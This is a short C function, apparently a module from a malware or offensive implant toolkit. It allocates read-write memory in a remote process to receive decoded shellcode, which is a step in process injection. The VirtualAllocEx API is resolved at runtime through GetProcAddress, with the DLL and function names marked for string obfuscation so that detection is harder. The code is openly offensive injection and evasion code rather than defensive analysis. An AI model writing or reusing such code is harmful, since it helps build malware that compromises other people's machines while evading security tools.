// Description: Copy decoded shellcode to RW mem in remote process using Dyn resolved VirtualAllocEx API
// Used WinAPIs: GetProcAddress, GetModuleHandleA
// IOCS strings:
LPVOID AllocMemory(HANDLE process, SIZE_T size) {
	typedef LPVOID (WINAPI * VirtualAllocEx_) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
	VirtualAllocEx_ _VirtualAllocEx = (VirtualAllocEx_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"VirtualAllocEx"<ob_end>);
	LPVOID result = _VirtualAllocEx(process, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	return result;
}
